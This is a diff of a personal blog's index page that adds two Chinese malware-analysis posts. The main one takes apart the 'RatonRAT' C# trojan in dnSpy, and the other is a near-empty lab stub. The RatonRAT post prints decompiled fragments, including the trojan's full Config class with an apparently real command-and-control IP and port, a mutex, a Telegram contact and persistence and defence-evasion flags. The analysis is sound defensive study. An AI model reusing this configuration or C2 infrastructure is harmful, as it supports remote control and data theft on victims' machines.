@@ -136,7 +136,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -163,6 +163,188 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/04/21/RatonRAT/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="woshinext.top">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | woshinext.top">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/21/RatonRAT/" class="post-title-link" itemprop="url">RatonRAT</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-04-21 21:54:13 / Modified: 22:17:15" itemprop="dateCreated datePublished" datetime="2026-04-21T21:54:13+08:00">2026-04-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="RatonRAT"><a href="#RatonRAT" class="headerlink" title="RatonRAT"></a>RatonRAT</h1><p>今天来分析一个基本的木马</p>
+<p>了解了一下先在市面上的木马一般都是用c#写的所以用dnSpy分析</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260421215826092.png" alt="image-20260421215826092"></p>
+<p>首先要找到木马逻辑</p>
+<p>在这个目录上可以看见系统文件和dnSpy的信息文件而主要逻辑是在client中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260421215956793.png" alt="image-20260421215956793"></p>
+<p>展开client可以看见</p>
+<p>其中Client.Raton是这个木马的主要逻辑</p>
+<p>costura是用来将dll整合成exe文件</p>
+<p>至于cilent.praperties是系统自动生成的不用理会</p>
+<p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260421220953053.png" alt="image-20260421220953053"></p>
+<p>在supervisor下有这这个木马的关键函数</p>
+<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Task <span class="title">InfoStuff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Supervisor.&lt;InfoStuff&gt;d__21 &lt;InfoStuff&gt;d__;</span><br><span class="line">	&lt;InfoStuff&gt;d__.&lt;&gt;t__builder = AsyncTaskMethodBuilder.<span class="built_in">Create</span>();</span><br><span class="line">	&lt;InfoStuff&gt;d__.&lt;&gt;<span class="number">4</span>__this = <span class="keyword">this</span>;</span><br><span class="line">	&lt;InfoStuff&gt;d__.&lt;&gt;<span class="number">1</span>__state = <span class="number">-1</span>;</span><br><span class="line">	&lt;InfoStuff&gt;d__.&lt;&gt;t__builder.Start&lt;Supervisor.&lt;InfoStuff&gt;d__21&gt;(ref &lt;InfoStuff&gt;d__);</span><br><span class="line">	<span class="keyword">return</span> &lt;InfoStuff&gt;d__.&lt;&gt;t__builder.Task;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个函数调用了异步函数使木马可以在后台运行来窃取电脑信息</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Client.Raton.Supervisor</span></span><br><span class="line"><span class="comment">// Token: 0x06000076 RID: 118 RVA: 0x00008AC8 File Offset: 0x00006CC8</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ResolveHostAndPort</span>(<span class="params"><span class="keyword">out</span> <span class="built_in">string</span> host, <span class="keyword">out</span> <span class="built_in">int</span> port</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	host = Config.ht;</span><br><span class="line">	port = Config.pt;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrWhiteSpace(host))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">string</span> text = host.Trim();</span><br><span class="line">	<span class="keyword">if</span> (text.StartsWith(<span class="string">&quot;http://&quot;</span>, StringComparison.OrdinalIgnoreCase))</span><br><span class="line">	&#123;</span><br><span class="line">		text = text.Substring(<span class="number">7</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (text.StartsWith(<span class="string">&quot;https://&quot;</span>, StringComparison.OrdinalIgnoreCase))</span><br><span class="line">	&#123;</span><br><span class="line">		text = text.Substring(<span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">int</span> num = text.LastIndexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (num &gt; <span class="number">0</span> &amp;&amp; num &lt; text.Length - <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">string</span> text2 = text.Substring(<span class="number">0</span>, num);</span><br><span class="line">		<span class="built_in">int</span> num2;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">int</span>.TryParse(text.Substring(num + <span class="number">1</span>), <span class="keyword">out</span> num2))</span><br><span class="line">		&#123;</span><br><span class="line">			host = text2;</span><br><span class="line">			port = num2;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数获取了黑客的ip等信息</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Client.Raton.Supervisor</span></span><br><span class="line"><span class="comment">// Token: 0x06000074 RID: 116 RVA: 0x000089C4 File Offset: 0x00006BC4</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SetKeepAlive</span>(<span class="params">Socket socket, <span class="built_in">uint</span> timeMs, <span class="built_in">uint</span> intervalMs</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">12</span>];</span><br><span class="line">	BitConverter.GetBytes(<span class="number">1U</span>).CopyTo(array, <span class="number">0</span>);</span><br><span class="line">	BitConverter.GetBytes(timeMs).CopyTo(array, <span class="number">4</span>);</span><br><span class="line">	BitConverter.GetBytes(intervalMs).CopyTo(array, <span class="number">8</span>);</span><br><span class="line">	socket.IOControl((IOControlCode)((<span class="built_in">ulong</span>)<span class="number">-1744830460</span>), array, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个函数让木马保持活性</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x02000006 RID: 6</span></span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Config</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Token: 0x04000022 RID: 34</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Version = <span class="string">&quot;v3.5.0&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000023 RID: 35</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Mutex = <span class="string">&quot;qkoxcbwHaoFUf4En5LVdu9W&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000024 RID: 36</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> pt = Convert.ToInt32(<span class="string">&quot;4890&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000025 RID: 37</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> ht = <span class="string">&quot;170.205.31.216&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000026 RID: 38</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> Startup = Convert.ToBoolean(<span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000027 RID: 39</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> Delay = Convert.ToInt32(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000028 RID: 40</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> ProcessCritical = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000029 RID: 41</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> HideFile = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002A RID: 42</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> Box = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002B RID: 43</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> BoxMsg = <span class="string">&quot;Hello, i&#x27;m the description of your raton client message box&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002C RID: 44</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> BoxIcon = <span class="string">&quot;No icon&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002D RID: 45</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> UAC = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002E RID: 46</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> Assist = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400002F RID: 47</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> OpenWebsite = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000030 RID: 48</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Website = <span class="string">&quot;https://t.me/sillyisafed&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000031 RID: 49</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> VM = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000032 RID: 50</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Tag = <span class="string">&quot;Infected&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000033 RID: 51</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> BoxTit = <span class="string">&quot;Hello, im a title for your message box&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000034 RID: 52</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> HidProc = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000035 RID: 53</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> UACBy = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000036 RID: 54</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Password = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000037 RID: 55</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> Raw = <span class="string">&quot;silly21&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000038 RID: 56</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> Reconnect = Convert.ToInt32(<span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000039 RID: 57</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> Defender = Convert.ToBoolean(<span class="string">&quot;false&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个类里包含了服务器的所有内容</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/04/17/Lab09-01-02-03/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="woshinext.top">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | woshinext.top">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/17/Lab09-01-02-03/" class="post-title-link" itemprop="url">Lab09-01.02.03</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-04-17 19:30:15 / Modified: 19:35:07" itemprop="dateCreated datePublished" datetime="2026-04-17T19:30:15+08:00">2026-04-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Lab09-1"><a href="#Lab09-1" class="headerlink" title="Lab09.1"></a>Lab09.1</h1><p><img src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260417193439996.png" alt="image-20260417193439996"></p>
+<p>这是这个函数</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
